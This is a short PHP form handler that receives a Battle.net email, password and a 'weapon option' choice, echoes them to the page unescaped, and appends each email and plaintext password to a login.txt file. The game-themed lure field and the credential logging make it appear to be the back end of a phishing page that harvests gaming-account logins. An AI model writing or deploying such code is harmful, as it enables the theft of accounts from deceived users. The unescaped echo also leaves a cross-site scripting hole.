<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $weaponOption = $_POST['weapon-option-1'];

    // Here you can do whatever you want with the form data
    // For now, let's just print it
    echo "BattleNet Email: $email <br>";
    echo "BattleNet Password: $password <br>";
    echo "Weapon Option: $weaponOption <br>";

    // Add the email and password to the login.txt file
    $file = fopen("login.txt", "a");
    fwrite($file, "Email: $email, Password: $password\n");
    fclose($file);

    // Redirect user or perform other actions as needed
}
?>

